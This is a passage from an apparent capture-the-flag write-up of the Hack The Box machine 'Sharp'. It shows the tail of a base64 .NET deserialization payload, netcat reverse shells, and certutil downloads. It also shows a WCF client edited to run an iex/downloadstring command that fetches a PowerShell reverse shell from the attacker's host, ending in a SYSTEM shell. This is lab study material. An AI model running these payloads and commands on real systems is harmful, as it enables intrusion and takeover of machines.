vY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL</span><br></pre>

<p>It will gives you an error ignore it and check your netcat</p>


<pre><span class="line">D:\SEALED\Sharp&gt;nc.exe -lvp 9001</span><br><span class="line">listening on [any] 4321 ...</span><br><span class="line">Windows PowerShell running as user lars on SHARP</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt;whoami</span><br><span class="line">sharp\lars</span><br><span class="line">PS C:\Windows\system32&gt; net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\SHARP</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            debug                    DefaultAccount</span><br><span class="line">Guest                    lars                     WDAGUtilityAccount</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre>

<p>1st flag is collected</p>

<pre><span class="line">PS C:\users\lars\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\lars\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---         1/7/2021   2:17 PM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\users\lars\desktop&gt; <span class="built_in">type</span> user.txt</span><br><span class="line">q5e84wq8e4qw8f4dw8f4sdf</span><br></pre>

<p>After enumerating and that took a lot of time i found dir called WCF and that's a windows service</p>

<pre><span class="line">PS C:\users\lars\documents\wcf&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\lars\documents\wcf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line">----                -------------         ------ ----                                                                 </span><br><span class="line">d-----       11/15/2020   1:40 PM                .vs                                                                  </span><br><span class="line">d-----       11/15/2020   1:40 PM                Client                                                               </span><br><span class="line">d-----       11/15/2020   1:40 PM                packages                                                             </span><br><span class="line">d-----       11/15/2020   1:40 PM                RemotingLibrary                                                      </span><br><span class="line">d-----       11/15/2020   1:41 PM                Server                                                               </span><br><span class="line">-a----       11/15/2020  12:47 PM           2095 wcf.sln</span><br></pre>

<p>I compressed it and moved it to dev dir so i can mount it to get the file</p>

<pre><span class="line">PS C:\users\lars\documents&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\lars\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line">----                -------------         ------ ----                                                                 </span><br><span class="line">d-----       11/15/2020   1:40 PM                wcf                                                                  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\users\lars\documents&gt; Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip</span><br><span class="line">PS C:\users\lars\documents&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\lars\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line">----                -------------         ------ ----                                                                 </span><br><span class="line">d-----       11/15/2020   1:40 PM                wcf                                                                  </span><br><span class="line">-a----         1/9/2021   6:09 PM       11598452 wcf.zip</span><br></pre>

<p>Moving the compressed file</p>

<pre><span class="line">move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev</span><br></pre>

<p>Mounting dev dir</p>

<pre><span class="line">C:\Users\Administrator&gt;net use X: \\10.10.10.219\dev</span><br></pre>

<h1>Exploiting WCF</h1>

<p>There is an exe file so let's De-compile it with Dnspy like we did before</p>

<img src="https://i.ibb.co/bdkbjc2/2021-05-01-22-13-16.png" alt="2021-05-01-22-13-16" border="0">

<p>Let's check what the main function contains</p>

<img src="https://i.ibb.co/Pz8c5rp/2021-05-01-22-15-55.png" alt="2021-05-01-22-15-55" border="0">

<p>It's connecting to port 8889, WCF is a windows service so it should be running as a privileged user</p>
<p>Now we need to edit the code to get our reverse shell</p>

<pre><span class="line">Console.WriteLine(wcfService.InvokePowerShell(<span class="string">"iex (new-object net.webclient).downloadstring('http://10.10.x.x/Invoke-PowerShellTcp.ps1')"</span>));</span><br></pre>

<img src="https://i.ibb.co/mXF9CSw/htb153.jpg" alt="htb153" border="0">

<p>Now we need to tranfser the exe and the dll library to victim machine to get our reverse shell</p>

<pre><span class="line">PS C:\users\lars\documents&gt; certutil -urlcache -split -f <span class="string">"http://10.10.xx.x/WcfRemotingLibrary.dll"</span> WcfRemotingLibrary.dll</span><br><span class="line">****  Online  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1e00</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\users\lars\documents&gt; certutil -urlcache -split -f <span class="string">"http://10.10.xx.x/WcfClient.exe"</span> WcfClient.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1400</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\users\lars\documents&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\lars\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       11/15/2020   1:40 PM                wcf</span><br><span class="line">-a----         1/9/2021   6:51 PM           5120 WcfClient.exe</span><br><span class="line">-a----         1/9/2021   6:50 PM           7680 WcfRemotingLibrary.dll</span><br></pre>

<h1>Root</h1>

<p>Execute the WCFclient.exe to get the reverse shell</p>

<span class="line">PS C:\users\lars\documents&gt; .\WcfClient.exe</span>

<p>Check your netcat now !</p>

<pre><span class="line">D:\SEALED\Sharp&gt;nc.exe -lvp 4322</span><br><span class="line">listening on [any] 4322 ...</span><br><span class="line">connect to [10.10.xx.xx] from DESKTOP-9LSPC40 [10.10.10.219] 49692</span><br><span class="line">Windows PowerShell running as user SHARP$ on SHARP</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">cd</span> /users/administrator/desktop</span><br><span class="line">PS C:\users\administrator\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                   </span><br><span class="line">----                -------------         ------ ----                                                                   </span><br><span class="line">-ar---         1/7/2021   2:17 PM             34 root.txt                                                               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\users\administrator\desktop&gt; cat root.txt</span><br><span class="line">asda4as49d5as9d59as2d9as2dasds</span><br></pre>

<p>Thanks for reading i hope you enjoyed.</p>
